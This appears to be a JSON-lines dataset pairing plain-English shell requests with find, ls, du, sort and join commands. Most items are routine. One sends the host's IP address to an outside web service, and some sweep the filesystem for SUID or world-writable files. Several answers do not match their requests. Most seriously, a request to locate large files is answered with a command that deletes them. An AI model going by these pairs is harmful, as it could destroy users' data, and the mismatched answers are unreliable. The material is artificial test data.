{"input": "List all *.txt files/directories under /etc", "answer": "find /etc -name \"*.txt\" -exec ls -l {} \\;"}
{"input": "List all *.txt files/directories under current directory", "answer": "find . -name \"*.txt\" -exec $SHELL -c 'echo \"$0\"' {} \\;"}
{"input": "List all *.txt files/directories under current directory ensuring white space safety", "answer": "find . -name '*.txt' -print0|xargs -0 -n 1 echo"}
{"input": "List all *fink* files/directories in entire file system", "answer": "find / \\( -type f -or -type d \\) -name \\*fink\\* -ls"}
{"input": "List all *fink* files/directories under current directory", "answer": "find . -name \"*fink*\" |xargs ls -l"}
{"input": "List all *jsp and *java regular files found in the current directory tree", "answer": "find . \\( -name '*jsp' -o -name '*java' \\) -type f -ls"}
{"input": "List all .c and .h files in the current directory tree that contain \"thing\"", "answer": "find . -name '*.[ch]' -print0 | xargs -r -0 grep -l thing"}
{"input": "List all .gif files in the current directory tree", "answer": "find . -name *.gif -exec ls {} \\;"}
{"input": "List all .jpg files in the home directory tree", "answer": "find . -name \"*.jpg\" -exec ls {} \\;"}
{"input": "List all .jpg files in the home directory tree in a fast way", "answer": "find . -name \"*.jpg\" -exec ls {} +"}
{"input": "List all .svn files/directories under current directory", "answer": "find . -name .svn -exec echo {} \\;"}
{"input": "List all IPV4 addresses found in all files under /etc directory", "answer": "find /etc -type f -exec cat '{}' \\; | tr -c '.[:digit:]' '\\n'  | grep '^[^.][^.]*\\.[^.][^.]*\\.[^.][^.]*\\.[^.][^.]*$'"}
{"input": "List all SGID and SUID files in entire file system", "answer": "find / -type f \\( -perm -4000 -o -perm -2000 \\) -ls"}
{"input": "List all active cron jobs, displaying only the command", "answer": "crontab -l | grep -v \"^#\" | awk '{print $6}'"}
{"input": "List all aliencoders.[0-9]+ files/directories under /home/jassi/ directory", "answer": "find /home/jassi/ -name \"aliencoders.[0-9]+\" -exec ls -lrt {} + | awk '{print $9}'"}
{"input": "List all available commands in Mac OS", "answer": "echo $PATH | tr ':' '\\n' | xargs -I {} find {} -maxdepth 1 -type f -perm '++x'"}
{"input": "List all broken symlinks excluding cyclic links under current directory", "answer": "find . -type l -printf \"%Y %p\\n\" | grep -w '^N'"}
{"input": "List all cron jobs where the minute part is either * or a number from 0 to 14", "answer": "crontab -l | awk '$1 == \"*\" || $1 ~ /^[0-9]+$/ && $1 < 15 {print}'"}
{"input": "List all cron jobs which contain \"word\"", "answer": "crontab -l | egrep \"word\""}
{"input": "List all crons in the environment", "answer": "cat /etc/passwd | sed 's/^\\([^:]*\\):.*$/crontab -u \\1 -l 2>\\&1/' | grep -v \"no crontab for\" | sh"}
{"input": "List all defined bash functions", "answer": "set | egrep '^[^[:space:]]+ [(][)][[:space:]]*$' | sed -r -e 's/ [(][)][[:space:]]*$//'"}
{"input": "List all directories in current directory, works even if they have weird names or names starting with a dash", "answer": "find -maxdepth 1 -type d | awk -F\"./\" '{print $2}'"}
{"input": "List all directories in maximum 1 level down the current directory", "answer": "find . -maxdepth 1 -type d -exec ls -dlrt {} \\;"}
{"input": "List all directories of the $topdir directory tree that contain a Makefile and at least one .py file", "answer": "find \"$topdir\" -name '*.py' -printf '%h\\0' | xargs -0 -I {} find {} -mindepth 1 -maxdepth 1 -name Makefile -printf '%h\\n' | sort -u"}
{"input": "List all directories under current directory", "answer": "find . -type d -exec ls -dlrt {} \\;"}
{"input": "List all entry names contained directly by directory in_save in the current directory, pausing for user input at each page", "answer": "find ./in_save/ -type f -maxdepth 1| more"}
{"input": "List all environment variables", "answer": "set"}
{"input": "List all environment variables (name and value) whose name either equals HOME or PATH, or starts with GO", "answer": "env | grep '^\\(GO\\|HOME=\\|PATH=\\)'"}
{"input": "List all environment variables (name and value) whose name either equals PATH or starts with GOBIN", "answer": "env | grep '^\\(GOBIN\\|PATH=\\)'"}
{"input": "List all environment variables containing 'USER' in their name or value that would result in running a command with 'sudo env'", "answer": "sudo env |grep USER"}
{"input": "List all environment variables whose name contains 'ipo', showing only the names of the variables and not their values", "answer": "env | grep ipo | awk 'BEGIN {FS=\"=\"} ; { print $1 } '"}
{"input": "List all environment variables whose name starts with PATH, showing the name and value of each one", "answer": "env | grep ^PATH"}
{"input": "List all existing environment variables in the current shell", "answer": "env | awk -F= '/[a-zA-Z_][a-zA-Z_0-9]*=/ { if (!system(\"[ -n \\\"${\" $1 \"+y}\\\" ]\")) print $1 }' | sort | uniq"}
{"input": "List all functions defined in the shell", "answer": "set | grep \" () $\" | cut -d' ' -f1"}
{"input": "List all leaf directories (directories which don't contain any sub-directory) under current directory", "answer": "find -depth -type d |sed 'h; :b; $b; N; /^\\(.*\\)\\/.*\\n\\1$/ { g; bb }; $ {x; b}; P; D'"}
{"input": "List all leaf directories of the current directory tree", "answer": "find -depth -type d |sed 'h; :b; $b; N; /^\\(.*\\)\\/.*\\n\\1$/ { g; bb }; $ {x; b}; P; D'"}
{"input": "List all nfs mount points on the system", "answer": "mount -l | grep 'type nfs' | sed 's/.* on \\([^ ]*\\) .*/\\1/'"}
{"input": "List all nfs mounts", "answer": "mount -l -t nfs4"}
{"input": "List all non-empty files under under current directory", "answer": "find . -type f ! -size 0"}
{"input": "List all non-hidden files in ~/junk", "answer": "find ~/junk   -name \"*\" -exec ls -l {} \\;"}
{"input": "List all of the subdirectories in the current directory with no trailing slash", "answer": "ls -d */ | cut -f1 -d'/'"}
{"input": "List all paths to files or directories under \"/data/\" that start with \"command-\" and end with \"-setup\", sort the result by the version number specified between \"command-\" and \"-setup\" (least to greatest)", "answer": "find /data/ -name 'command-*-setup' | sort -t - -V -k 2,2"}
{"input": "List all php files below current directory whose full pathname name does not include \"libs\", \"tmp\", \"tests\", or \"vendor\", sorted by number of lines, letting the user page interactively through the output", "answer": "find . -name '*.php' -print0 | xargs -0 wc -l | sort -nr | egrep -v \"libs|tmp|tests|vendor\" | less"}
{"input": "List all regular file owned by root with permissions 4000", "answer": "find / -type f -user root -perm -4000 -exec ls -l {} \\;"}
{"input": "List all regular files in and below the home directory that have been modified in the last 90 minutes", "answer": "find ~ -type f -mmin -90 | xargs ls -l"}
{"input": "List all regular files in and below the home directory that were modified more than 5 years ago", "answer": "find ~ -type f -mtime +1825 |xargs -r ls -l"}
{"input": "List all regular files matching the name pattern \"$1*\" (where $1 is a positional parameter) under '/usr', '/bin', '/sbin' and '/opt' directory tree", "answer": "find /usr /bin /sbin /opt -name \"$1*\" -type f -ls"}
{"input": "List all regular files residing in the current directory tree and containing string \"/bin/ksh\"", "answer": "find . -type f -exec grep -li '/bin/ksh' {} \\;"}
{"input": "List all regular files under current directory (not white space sage)", "answer": "find . -type f -print | xargs -n 1"}
{"input": "List all regular files under current directory ensuring white space safety", "answer": "find . -type f -print0 | xargs -0 -n 1"}
{"input": "List all symlinks under current directory and search for targetfile.txt in this list", "answer": "find . -type l | xargs -I % ls -l % | grep targetfile.txt"}
{"input": "List all the .c files under the current directory and below in a 3 column format", "answer": "find . -name \"*.c\" | xargs -n3"}
{"input": "List all unique parent directories of .class files found under the current directory", "answer": "find -name '*.class' -printf '%h\\n' | sort -u"}
{"input": "List all your files including everything in sub-directories", "answer": "find ~"}
{"input": "List all ~/bin/FilesDvorak/.* (non-recursive) and ~/.PAST_RC_files/.* (recursive) files/directories and take common entries between these two lists", "answer": "comm -12 <(find ~/bin/FilesDvorak/.* -maxdepth 0) <(find ~/.PAST_RC_files/.*)"}
{"input": "List and remove all regular files named \"core\" that are larger than 500KB", "answer": "find /prog -type f -size +1000 -print -name core -exec rm {} \\;"}
{"input": "List and remove all regular files named \"core\" under /prog that are larger than 500k", "answer": "find /prog -type f -size +1000 -print -name core -exec rm {} \\;"}
{"input": "List and sort all leaf directories (directories which don't contain any sub-directory) under current directory", "answer": "find . -type d | sort | awk '$0 !~ last \"/\" {print last} {last=$0} END {print last}'"}
{"input": "List any line in \"f1\" or \"f2\" which does not appear in the other and delete all tab characters in the output", "answer": "comm -3 <(sort -un f1) <(sort -un f2) | tr -d '\\t'"}
{"input": "List characters from standard input showing backslash escapes for non-displayables", "answer": "od -cvAnone -w1"}
{"input": "List common files in directories \"1\" and \"2\"", "answer": "cat <(ls 1 | sort -u) <(ls 2 | sort -u) | uniq -d"}
{"input": "List directories in the current working directory and remove the trailing \"/\"", "answer": "ls -1p | grep '/$' | sed 's/\\/$//'"}
{"input": "List each directory in the current directory prefixed with its disk usage in human readable format and sorted from smallest to largest", "answer": "du -sh */ | sort -n"}
{"input": "List each file or directory in the current directory prefixed by its filesize in bytes and sorted from smallest to largest", "answer": "du -a --max-depth=1 | sort -n"}
{"input": "List each file or directory in the current directory prefixed by its human readable filesize and sorted from largest to smallest", "answer": "du -h --max-depth=0 * | sort -hr"}
{"input": "List each file or directory in the current directory prefixed with its filesize in MB and sorted from smallest to largest", "answer": "du -smc * | sort -n"}
{"input": "List each file or directory in the current directory prefixed with its filesize in bytes and sorted from smallest to largest", "answer": "du -s * | sort -n"}
{"input": "List each subdirectory name composing the current working directory", "answer": "pwd | cut -b2- | tr '/' '\\n'"}
{"input": "List each unique case insensitive character in \"file\" prefixed by number of occurrences", "answer": "grep -o . file | sort -f | uniq -ic"}
{"input": "List each unique case insensitive character in \"file\" prefixed by number of occurrences and sorted from most frequent to least frequent", "answer": "grep -o . filename | tr '[:upper:]' '[:lower:]' | sort | uniq -c | sort -nr"}
{"input": "List each unique character in \"file\" prefixed by number of occurrences", "answer": "grep -o . file | sort | uniq -c"}
{"input": "List each unique character in \"file\" prefixed by number of occurrences and sorted from most frequent to least frequent", "answer": "grep -o . filename | sort | uniq -c | sort -nr"}
{"input": "List every symbolic link in every home directory's subdirectory owned by group `staff'", "answer": "find `pwd` -group staff -exec find {} -type l -print ;"}
{"input": "List executable files in the current directory, sort the list and then display the differences between the list and file .gitignore", "answer": "find . -perm /111 -type f | sed 's#^./##' | sort | diff -u .gitignore -"}
{"input": "List file contents of compressed file $i", "answer": "gzip -l $i"}
{"input": "List file contents of compressed file 'compressed.tar.gz'", "answer": "gzip -l compressed.tar.gz"}
{"input": "List files and directories one level deep in the current directory tree", "answer": "tree -L 2"}
{"input": "List files ending in .html and residing in the current directory tree", "answer": "find . -name \"*.html\""}
{"input": "List files greater than 1024KB under /path/to/directory and print the time and size on stdout", "answer": "find /path/to/directory -type f -size +1024k -exec ls -lh {} \\; | awk '{ print $8 \": \" $5 }'"}
{"input": "List files in \"dir1\" that are not in \"dir2\"", "answer": "comm -23 <(ls dir1 |sort) <(ls dir2|sort)"}
{"input": "List files in directory \"one\" and \"two\" that do not exist in the other", "answer": "sort <(ls one) <(ls two) | uniq -u"}
{"input": "List files in the current directory and below", "answer": "find -ls"}
{"input": "List files in the current directory and below except for GIT files", "answer": "find . -not -iwholename '*/.git/*'"}
{"input": "List files in the current directory tree using echo", "answer": "find . -exec echo {} ;"}
{"input": "List files in the current directory tree which have permissions rwx for user and rw for group and others", "answer": "find . -perm 766 -exec ls -l {} \\;"}
{"input": "List files larger than 10MB in the /var directory recursively", "answer": "find /var/ -size +10M -exec ls -lh {} \\;"}
{"input": "List files larger than 10MB under /var/log", "answer": "find /var/log -size +10M -ls"}
{"input": "List files larger than 10MB under /var/log /tmp that haven't changed in a month", "answer": "find /tmp /var/tmp -size +30M -mtime 31 -ls"}
{"input": "List files named \"accepted_hits.bam\" in the current directory tree prefixing their names with \"somecommand\"", "answer": "find `pwd` -name \"accepted_hits.bam\" | xargs -i echo somecommand {}"}
{"input": "List files under $CURR_DIR which were modified, accessed or whose status were changed $FTIME ago replacing the $CURR_DIR path string to './'", "answer": "find ${CURR_DIR} -type f \\( -ctime ${FTIME} -o -atime ${FTIME} -o -mtime ${FTIME} \\) -printf \"./%P\\n\""}
{"input": "List files under current directory according to their size in descending order", "answer": "find . -type f -exec ls -s {} \\; | sort -n -r"}
{"input": "List first 5 files named 'something' that are found under current directory", "answer": "find . -name something -print | head -n 5"}
{"input": "List in detail all *.txt files in the current directory tree, omitting paths ./Movies/*, ./Downloads/*, and ./Music/*", "answer": "find . -type f -name \"*.txt\" ! -path \"./Movies/*\" ! -path \"./Downloads/*\" ! -path \"./Music/*\" -ls"}
{"input": "List in detail regular files from the current directory tree whose names match Perl regular expression '\\w+-\\d+x\\d+\\.\\w+$'", "answer": "find -type f |  grep -P '\\w+-\\d+x\\d+\\.\\w+$' | sed -re 's/(\\s)/\\\\\\1/g' | xargs ls -l"}
{"input": "List in detail the regular files from the /somelocation/log_output directory tree that were last changed more than 40 days ago", "answer": "find /somelocation/log_output -type f -ctime +40 -exec ls -l {} \\;"}
{"input": "List jobs and their process ids and print them by replacing newline with '^'", "answer": "joblist=$(jobs -l | tr \"\\n\" \"^\")"}
{"input": "List non-hidden regular files in the current directory tree that were last modified more than 500 days ago", "answer": "find . -type f -not -name '.*' -mtime +500 -exec ls {} \\;"}
{"input": "List only the non-hidden empty files only in the current directory", "answer": "find . -maxdepth 1 -empty -not -name \".*\""}
{"input": "List path/filename of all PHP files under current directory whose file type description or path/name contains \"CRLF\"", "answer": "find . -type f -iname \"*.php\"  -exec file \"{}\" + | grep CRLF"}
{"input": "List regular files in current directory with read, write and execute permission for all users and also show the permissions", "answer": "find . -type f  -perm a=rwx -exec ls -l {} \\;"}
{"input": "List root's regular files with permissions 4000", "answer": "find / -type f -user root -perm -4000 -exec ls -l {} \\;"}
{"input": "List the MD5 digest of all files under \"teste1\" and \"teste2\" sorted alphabetically", "answer": "find teste1 teste2 -type f -exec md5 -r {} \\; | sort"}
{"input": "List the combined path of the current working directory and \"file.txt\"", "answer": "ls \"`pwd`/file.txt\""}
{"input": "List the current directory recursively ignoring ./src/emacs/ and all its contents", "answer": "find . -path ./src/emacs -prune -o -print"}
{"input": "List the current directory recursively ignoring the \"dir1\" subdirectory's content", "answer": "find . -print -name dir -prune"}
{"input": "List the directory paths of all file.ext files under present working directory", "answer": "find . -name \"file.ext\" -execdir pwd ';'"}
{"input": "List the drive of each \"/dev/\" disk mount point", "answer": "mount | grep '^/dev/' | sed -E 's/([^ ]*) on ([^ ]*) .*/\"\\2\" is located on \"\\1\"/'"}
{"input": "List the files from the current directory tree that contain lines matching regular expression  '^Subject:.*unique subject'", "answer": "find . -type f -print | xargs grep -il '^Subject:.*unique subject'"}
{"input": "List the files from the current directory tree that contain lines matching regular expression '^From:.*unique sender', ignoring ~/src and ~/bin", "answer": "find . -name bin -prune -o -name src -prune -o -type f -print | xargs egrep -il '^From:.*unique sender'"}
{"input": "List the files in \"archive.tar.gz\"", "answer": "gzip -l archive.tar.gz"}
{"input": "List the files in the /etc directory tree containing text \"old1.old2.co.com\"", "answer": "find /etc -type f -print | xargs grep -il old1\\.old2\\.co\\.com"}
{"input": "List the files in the /etc directory tree containing text '128.200.34.'", "answer": "find /etc -type f -print | xargs grep -il '128\\.200\\.34\\.'"}
{"input": "List the files/directories under /PATH_to_SEARCH, do a numeric sort and print the ones with different inode numbers", "answer": "find /PATH_to_SEARCH -ls | sort -n | awk '!seen[$1]++'"}
{"input": "List the full path of each directory in the current working directory", "answer": "tree -dfi -L 1 \"$(pwd)\""}
{"input": "List the full path of each directory under the current working directory", "answer": "tree -dfi \"$(pwd)\""}
{"input": "List the largest file in long list format of all the files under the current directory", "answer": "find . -type f -ls | sort -nrk7 | head -1 #unformatted"}
{"input": "List the largest file prefixed by its size in bytes of all files under the current directory", "answer": "find . -type f -name '*.gz' -printf '%s %p\\n'|sort -nr|head -n 1"}
{"input": "List the last entry of the numerically sorted list of all files and folders under \"/foldername\"", "answer": "find /foldername | sort -n | tail -1"}
{"input": "List the last modified file under \"$DIR\"", "answer": "find $DIR -type f -printf \"%T@ %p\\n\" | sort -n | cut -d' ' -f 2 | tail -n 1"}
{"input": "List the names of all file.ext files/directories under present working directory", "answer": "find `pwd` -name \"file.ext\" -printf \"%f\\n\""}
{"input": "List the regular files of the current directory tree that contain string \"texthere\"", "answer": "find -type f -exec grep -l \"texthere\" {} +"}
{"input": "List the unique file extensions of all files under the current directory", "answer": "find . -type f | grep -o -E '\\.[^\\.]+$' | sort -u"}
{"input": "List the unique parent directories of all .class files found in the entire filesystem", "answer": "find / -name *.class -printf '%h\\n' | sort --unique"}
{"input": "List the unique parent directories of all .class files found under \"/root_path\"", "answer": "find /root_path -type f -iname \"*.class\" -printf \"%h\\n\" | sort -u"}
{"input": "List the unique second \"/\" delimited field of every line from standard input prefixed by the number of occurrences", "answer": "cut -d/ -f1-2 | cut -d/ -f2- | sort | uniq -c"}
{"input": "List the unique tab delimited field number \"$FIELD\" in all files, prefix with the number of occurrences, sort from most frequent to least frequent", "answer": "cut -f $FIELD * | sort| uniq -c |sort -nr"}
{"input": "List the z* links in the /usr/bin directory and the file to which it points to", "answer": "find /usr/bin  -type l  -name \"z*\" -exec ls  -l {} \\;"}
{"input": "List the z* links in the /usr/bin directory with inode information and the file to which it points to", "answer": "find /usr/bin -type  l  -name \"z*\" -ls"}
{"input": "List unique MD5 digests of all files in the current directory ending in .txt", "answer": "md5sum *.txt | cut -d ' ' -f 1 | sort -u"}
{"input": "List unique series of 3 characters in file \"$1\" prefixed by the number of occurrences and sorted from most frequent to least frequent", "answer": "fold -w3 \"$1\" | sort | uniq -c | sort -k1,1nr -k2"}
{"input": "Lists all directories in '/home/alice/Documents/'", "answer": "ls -d /home/alice/Documents/*/"}
{"input": "Lists all directories in the current folder", "answer": "ls -d ./*/"}
{"input": "Lists all files in a '/home/dreftymac/' folder and subfolders without recursion", "answer": "ls /home/dreftymac/*"}
{"input": "Lists all files in a current folder, separating names with comma", "answer": "ls -1 | paste -sd \",\" -"}
{"input": "Lists all files in a current folder, separating names with space", "answer": "ls -1 | awk 'ORS=\" \"'"}
{"input": "Lists all files that matches path pattern with wildcards", "answer": "ls -l /lib*/ld-linux*.so.2"}
{"input": "Lists all manual pages", "answer": "apropos -r '.*'"}
{"input": "Lists all paths to all subfolders in a current folder", "answer": "ls -mR * | sed -n 's/://p'"}
{"input": "Lists all subdirectories in a current folder, removing trailing slash", "answer": "ls -d */ | cut -f1 -d'/'"}
{"input": "Lists all subdirectories in current directory with a trailing slash", "answer": "ls -d ./*/                     ### more reliable BSD ls"}
{"input": "Lists all subdirectories in the current directory with the trailing slash removed", "answer": "ls -d1 */ | tr -d \"/\""}
{"input": "Lists content of all subfolder (without recursion) in a current folder", "answer": "ls -d -1 $PWD/**/*"}
{"input": "Lists content of compressed text file", "answer": "zless MyFile"}
{"input": "Lists file descriptors of a current process", "answer": "ls -l /proc/self/fd/"}
{"input": "Lists the pids of all processes that have process '1782' as their parent", "answer": "pstree -p 1782 | sed 's/-/\\n/g' | sed -n -e 's/.*(\\([0-9]\\+\\)).*/\\1/p'"}
{"input": "Locate OGG files under the home directory larger than 100 megabytes", "answer": "find $HOME -iname '*.ogg' -size +100M"}
{"input": "Locate all *.txt files in the current directory tree", "answer": "find . -name \"*.txt\""}
{"input": "Locate all OGG files that reside in the home directory and have not been accessed in the past 30 days", "answer": "find $HOME -iname '*.ogg' -atime +30"}
{"input": "Locate all files \"needle.txt\"", "answer": "find . -name \"needle.txt\""}
{"input": "Locate all files in the current directory and below that do not have \"testfileasdf\" in their names", "answer": "find -not -name \"*testfileasdf*\""}
{"input": "Locate all files in the current directory and below that have \"testfile\" in their names", "answer": "find -name \"*testfile*\""}
{"input": "Locate all files in the current directory and below that have \"testfile\" in their names regardless of the case", "answer": "find -iname \"*TESTFILE*\""}
{"input": "Locate all files named 'restore.php' in the current directory and 3 levels below", "answer": "find . -maxdepth 4 -name 'restore.php'"}
{"input": "Locate all passwd files on the system", "answer": "find / -name passwd"}
{"input": "Locate all the hard links of file `passwd'", "answer": "find / -samefile passwd"}
{"input": "Locate and rename unprintable directories using inode numbers", "answer": "find . -inum 211028 -exec mv {} newname.dir \\;"}
{"input": "Locate file \"file1\"", "answer": "find -name file1"}
{"input": "Locate files not owned by any user or group", "answer": "find / -path /proc -prune -o -nouser -o -nogroup"}
{"input": "Locate files that reside in the /u/bill directory tree and were last accessed between 2 and 6 minutes ago", "answer": "find /u/bill -amin +2 -amin -6"}
{"input": "Locate files that reside in the home directory and have not been accessed in the past 30 days", "answer": "find $HOME -atime +30"}
{"input": "Locate files whose status was changed less than 1 day ago", "answer": "find . -ctime -1 -print"}
{"input": "Locate files with user permissions rwx owned by my_user", "answer": "find . -user my_user -perm -u+rwx"}
{"input": "Locate the httpd.conf file on the system", "answer": "find / -name httpd.conf"}
{"input": "Locate world-writable files and directories on the system", "answer": "find / -path /proc -prune -o -perm -2 ! -type l -ls"}
{"input": "Locates Erlang distribution, and prints release number from 'RELEASES' file", "answer": "awk -F, 'NR==1 {gsub(/\"/,\"\",$3);print $3}' \"$(dirname $(readlink -f $(which erl)))/../releases/RELEASES\""}
{"input": "Locating large files (> 100 MB) in /home/ for 'cleaning'", "answer": "find /home -type f -size +100M -delete"}
{"input": "Login to \"$HOST\" and create file \"$FILE_PATH\" if it does not exist", "answer": "ssh -q $HOST \"[[ ! -f $FILE_PATH ]] && touch $FILE_PATH\""}
{"input": "Look for \"filename\" in the current directory and below", "answer": "find -name filename"}
{"input": "Look for *log files in directories at least three levels down the directory tree", "answer": "find / -mindepth 3  -name \"*log\""}
{"input": "Look for *log files in directories at most three levels down the directory tree", "answer": "find / -maxdepth 3  -name \"*log\""}
{"input": "Look for SGID files and directories", "answer": "find / -perm /g=s"}
{"input": "Look for SUID files and directories", "answer": "find / -perm +4000"}
{"input": "Look for `regexp' in binary files", "answer": "find .  -type f -print|xargs file|grep -i text|cut -fl -d:    | xargs grep regexp"}
{"input": "Look for all files whose names match pattern 'my*'", "answer": "find / -name 'my*'"}
{"input": "Look for any files that have not been modified in the last two days", "answer": "find -mtime +2"}
{"input": "Look for any files that were modified 2-5 days ago", "answer": "find -mtime +2 -mtime -5"}
{"input": "Look for file `Chapter1' under /usr and /home", "answer": "find /usr /home -name Chapter1 -type f"}
{"input": "Look for files in the current directory tree to which the group users have full access", "answer": "find . -perm -070 -print"}
{"input": "Look for files that have SUID or SGID set", "answer": "find / -perm +6000 -type f"}
{"input": "Look for files whose names begin with letters a-j", "answer": "find  / -name \"[a-j]*\" -print"}
{"input": "Look for files with wide open permissions", "answer": "find . -type f  -perm 777 -exec ls -l {} \\;"}
{"input": "Look in the current directory and below for all files whose names begin with either \"my\" or \"qu\"", "answer": "find . \\( -name \"my*\" -o -name \"qu*\" \\) -print"}
{"input": "Lookup information for user \"vivek\"", "answer": "finger vivek"}
{"input": "Make $WEEKS_TO_SAVE+1 directories named \"weekly.N\" where N ranges from 0 to \"$WEEKS_TO_SAVE\"", "answer": "mkdir -p $(seq -f \"weekly.%.0f\" 0 $WEEKS_TO_SAVE)"}
{"input": "Make 3 directories named \"$HOME/Labs/lab4a/folder\" followed by a 3 width zero padded number from 1 to 3", "answer": "mkdir $(seq -f \"$HOME/Labs/lab4a/folder%03g\" 3)"}
{"input": "Make 999 folders one inside another where first 998 of them is named as \"folderX\" where X goes from 1 to 998 and the last folder named as \"folder9991000\"", "answer": "mkdir -p folder$( seq -s \"/folder\" 999 )1000"}
{"input": "Make a POST request to \"http://dweet.io/dweet/for/cycy42\" with data \"PiIP\" set to the IP address of the system", "answer": "wget --post-data=\"PiIP=$(hostname -I)\" http://dweet.io/dweet/for/cycy42"}
{"input": "Make a copy of file.txt in all directories in current directory - names may not contain spaces", "answer": "ls -d */ | xargs -iA cp file.txt A"}
{"input": "Make a copy of file1 in dir1, dir2, and dir3", "answer": "echo dir1 dir2 dir3 | xargs -n 1 cp file1"}
{"input": "Make a copy of the entire contents of SRCFOLDER called \"DESTFOLDER\", if DESTFOLDER exists, the copy will be placed within it", "answer": "cp -R SRCFOLDER DESTFOLDER/"}
{"input": "Make a copy of the entire contents of dir1 in the Pictures directory located in the user's home directory", "answer": "cp -r dir1/ ~/Pictures/"}
{"input": "Make a directory in the current working directory with a random 32 alphanumeric character name", "answer": "cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 | xargs mkdir"}
{"input": "Make a list of all files in the current directory tree, except *.png and *.class, and view it in the vim editor", "answer": "find . | grep -E -v '\\.png$|\\.class$' | vim -"}
{"input": "Make a list of regular files from the current directory tree that have more than 1 link and view it with the \"less\" pager", "answer": "find . -type f -noleaf -links +1 -printf \"%n %i %f\\t%h\\n\" | sort | less"}
{"input": "Make a new directory \"new-dir\" in every directory in the current directory tree", "answer": "find . -type d | xargs -I \"{x}\" mkdir \"{x}\"/new-dir"}
{"input": "Make a new directory \"new-dir\" in every directory in the current working directory non-recursively", "answer": "find . -maxdepth 1 -type d | xargs -I \"{x}\" mkdir \"{x}\"/new-dir"}
{"input": "Make all directories in the current directory tree accessible to anybody", "answer": "find . -type d -print0 | xargs -0 chmod go+rx"}
{"input": "Make all the bugzilla subdirectories permission 775", "answer": "find bugzilla -type d -exec chmod 775 {} \\;"}
{"input": "Make directory \"/data/db\"", "answer": "sudo mkdir /data/db"}
{"input": "Make directory \"/etc/cron.5minute\"", "answer": "mkdir /etc/cron.5minute"}
{"input": "Make directory \"/tmp/imaginary/\" on remote host before archiving \"file\" to \"user@remote:/tmp/imaginary/\"", "answer": "rsync -aq --rsync-path='mkdir -p /tmp/imaginary/ && rsync' file user@remote:/tmp/imaginary/"}
{"input": "Make directory \"/var/svn\"", "answer": "sudo mkdir /var/svn"}
{"input": "Make regular files from debian/fglrx-amdcccle/usr/lib/fglrx/bin/ executable for all", "answer": "find debian/fglrx-amdcccle/usr/lib/fglrx/bin/ -type f | xargs chmod a+x"}
{"input": "Mark variables and function which are modified or created for export to the environment of subsequent commands", "answer": "set -a"}
{"input": "Md5sum the last 5 files in /directory1/directory2/", "answer": "find /directory1/directory2/ -maxdepth 1 -type f | sort | tail -n 5 | xargs md5sum"}
{"input": "Measure the disk space taken up by all *.txt files in directory tree /home/d", "answer": "find /home/d -type f -name \"*.txt\" -printf \"%s\\n\" | awk '{s+=$0}END{print \"total: \"s\" bytes\"}'"}
{"input": "Measure the disk space taken up by all *.txt files in directory trees folder1 and folder2", "answer": "find folder1 folder2 -iname '*.txt' -print0 | du --files0-from - -c -s | tail -1"}
{"input": "Measure the disk space taken up by all *.txt files in the current directory tree", "answer": "find . -name \"*.txt\" -print0 |xargs -0 du -ch"}
{"input": "Measure the disk space taken up by all TXT files in the current directory tree", "answer": "find . -iname \"*.txt\" -exec du -b {} + | awk '{total += $1} END {print total}'"}
{"input": "Merge 10 already sorted files and display the result, pausing at each page of output", "answer": "sort -m a b c d e f g h i j | more"}
{"input": "Merge already sorted files \"*.txt\" and split the result into files of at most 1000000 lines each with a numeric suffix and a prefix \"output\"", "answer": "sort -m *.txt | split -d -l 1000000 - output"}
{"input": "Merge already sorted files \"file*.txt\" and split the result into files of at most 100000 lines each with a prefix \"sorted_file\"", "answer": "sort --merge file*.txt | split -l 100000 - sorted_file"}
{"input": "Merge already sorted files in the current directory ending in \".$suffix\"", "answer": "sort -m *.$suffix"}
{"input": "Merge already sorted files in the current directory starting with \"_tmp\" and write the output to \"data.tsv.sorted\"", "answer": "sort -m _tmp* -o data.tsv.sorted"}
{"input": "Merge colon-separated information from file1 and file2 where first field of both files matches", "answer": "join -t: <(sort file1) <(sort file2)"}
{"input": "Merge colon-separated information from file1 and file2 where second field of both files matches, sorting the result based on this field - for each line, output: first 3 fields of first file, followed by first 3 fields of second file", "answer": "join -o 1.1,1.2,1.3,2.1,2.2,2.3 -j2 <(sort -k2 file1) <(sort -k2 file2)"}
{"input": "Merge colon-separated information from standard input and file1.txt where the first field of both files matches, print unpairable lines from both files, replace missing fields with \"no-match\", and output the second field from standard input and the second and third field from file1.txt", "answer": "join -t, -o 1.2,2.2,2.3 -a 1 -a 2 -e 'no-match' - <(sort file1.txt)"}
{"input": "Merge colon-separated information from standard input and file1.txt where the first field of both files matches, print unpairable lines from standard input, replace missing fields with \"no-match\", and output the second field from standard input and the second and third field from file1.txt", "answer": "join -t, -o 1.2,2.2,2.3 -a 1 -e 'no-match' - <(sort file1.txt)"}
{"input": "Merge content of decompressed files \"$part0\", \"$part1\", and so on", "answer": "sort -m <(zcat $part0 | sort) <(zcat $part1 | sort) ..."}
{"input": "Merge data in file1 and file2 where second field is common in both files", "answer": "join -j2 <(sort -k2 file1) <(sort -k2 file2)"}
{"input": "Merge each line in \"file\" into a single comma separated line", "answer": "paste -d, -s file"}
{"input": "Merge each line of standard input into a single comma separated line", "answer": "paste -s -d\",\""}
{"input": "Merge each non-blank line of standard input into a single comma separated line", "answer": "grep -v '^$' | paste -s -d\",\" -"}
{"input": "Merge file1 and file2 by outputting all lines where the first comma-separated field of both files matches, followed by extra fields in file1 and those in file2", "answer": "join -t, <(sort file1) <(sort file2)"}
{"input": "Merge lines from files \"file1\", \"file2\", \"file3\", \"file4\", \"file5\", replace \"\\t\" with \" \\t\", and format the \"\\t\" delimited result as a table", "answer": "paste file{1,2,3,4} | sed -e 's/\\t/ \\t/g' | column -t -s$'\\t'"}
{"input": "Merge lines whose first comma-separated field in file 'in1' also appears as a first comma-separated in file 'in2' - both files must be sorted, and the output format of each line will be: first field of in1, second field of in2, and third field of in2", "answer": "join -t, -o 1.1,1.2,2.3 in1 in2"}
{"input": "Merge lines whose first comma-separated field in file 'in1' also appears as a first comma-separated in file 'in2' - both files must be sorted", "answer": "join -t, in1 in2"}
{"input": "Merge lines whose first comma-separated field in file 'in1' also appears as a first comma-separated in file 'in2', also outputting unmatched lines from 'in2' - both files must be sorted, and the output format of each line will be: first field of in1, second field of in2, and third field of in2", "answer": "join -t, -o 1.1,1.2,2.3 -a1 in1 in2"}
{"input": "Merge the first \"$lc\" lines of \"current.txt\" and the last \"$lc\" lines of \"current.txt\" and display the result as a comma separated table", "answer": "paste <(head -\"$lc\" current.txt) <(tail -\"$lc\" current.txt) | column -t -o,"}
